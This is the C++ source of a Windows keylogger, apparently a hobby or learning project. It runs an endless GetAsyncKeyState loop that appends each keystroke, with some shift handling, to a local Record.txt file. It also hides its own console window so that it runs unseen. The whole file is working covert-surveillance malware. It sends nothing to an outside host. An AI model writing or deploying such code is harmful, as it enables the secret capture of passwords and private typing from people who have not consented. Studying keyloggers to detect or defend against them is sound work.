//============================================================================
// Name        : Keylogger.cpp
// Author      : 
// Version     :
// Copyright   : Your copyright notice
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void log(); //actual keylogger (records all the key in a Record.txt file
void hide(); // function to hide the program while it is used

int main() {
	hide();
	log();
	return 0;
}

void log()
{
	char key;

	while(true) //the keylogger should run continuously
	{
		//sleep(0)
		for (key=8; key<=222; key++) //range of characters we want to check
		{
			if (GetAsyncKeyState(key) == -32767) //it means "if there is an interrupt for a particular key" or "if a key is pressed"
			{
				ofstream write ("Record.txt", ios::app); //with the second term we avoid recreate a new file everytime we want to store something

				if( (key>64) && (key<91) && !(GetAsyncKeyState(0x10)) ) //if char is between those numbers (capital letters) and 'shift' is NOT pressed then...
				{
					key+=32; //transform key to lower case
					write << key;
					write.close();
					break;
				}
				else if ((key>64)&&(key<91)) //I know shift is not pressed due to previous if statement
				{
					write << key;
					write.close();
					break;
				}
				else
				{
					switch(key)
					{
						case 49:
						{
							if (GetAsyncKeyState(0x10))
								write << "!";
							else write << "1";
						}
						break;
						case 50:
						{
							if (GetAsyncKeyState(0x10))
								write << "\"";
							else write << "2";
						}
						break;
						case 56:
						{
							if (GetAsyncKeyState(0x10))
								write << "(";
							else write << "8";
						}
						break;
						case 57:
						{
							if (GetAsyncKeyState(0x10))
								write << ")";
							else write << "9";
						}
						break;
						case 48:
						{
							if (GetAsyncKeyState(0x10))
								write << "=";
							else write << "0";
						}
						break;
						case VK_SPACE: //VK_SPACE is the virtual key for 'space' (avoid to use ascii value)
							write << " ";
						break;
						case VK_RETURN:
							write << "\n";
						break;
						case VK_TAB:
							write << "	";
						break;
						case VK_BACK:
							write << "<BackSpace>";
						break;
						case VK_ESCAPE:
							write << "<Esc>";
						break;
						case VK_DELETE:
							write << "<Delete>";
						break;
					}
				}
			}
		}
	}
}
void hide()
{
	HWND stealth; //handler
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0); //0 means don't show the window
}
